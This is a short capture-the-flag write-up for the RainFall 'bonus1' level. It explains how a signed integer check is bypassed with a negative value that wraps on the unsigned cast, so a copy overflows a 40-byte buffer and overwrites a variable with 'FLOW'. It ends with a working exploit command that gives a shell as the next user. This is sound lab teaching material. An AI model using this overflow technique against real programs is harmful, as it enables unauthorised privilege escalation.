# Bonus 1

The first parameter is converted to an int we'll call `val` using `atoi` and stored after the 40 bytes `dest` buffer.
`val` is then checked to be under 9, if it isn't the program exits.
If this first check passes `val * 4` amount of characters from the second parameter are copied into `dest`, presenting an opportunity to overflow.
After that a second check is executed, calling `exec` if `val` is equal to `FLOW`.

## First bypass
We need to copy (11 * 4) bytes of argv[2] into the `dest` buffer, overwriting `val` after the first check.

To do that and bypass the first check we'll use an [underflow](https://www.geeksforgeeks.org/representation-of-negative-binary-numbers/) that'll be negative yet equal to 11 when cast to `size_t` (unsigned).

Let's do some [bitwise](https://bitwisecmd.com/)
```
11 OR INT_MIN
11 | -2147483648
	11              00000000000000000000000000001011	0xb
|	-2147483648	10000000000000000000000000000000	-0x80000000
=	-2147483637	10000000000000000000000000001011	-0x7ffffff5
```
We'll need to give `-2147483637` as the first argument

## Second bypass
Now that we can control the amount of bytes from the second argument copied into the buffer let's just fill it with 40 bytes of junk and replace `val` with `FLOW`:
```shell
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print 40 * "A" + "FLOW"')
$ whoami
bonus2
```
Bingo!
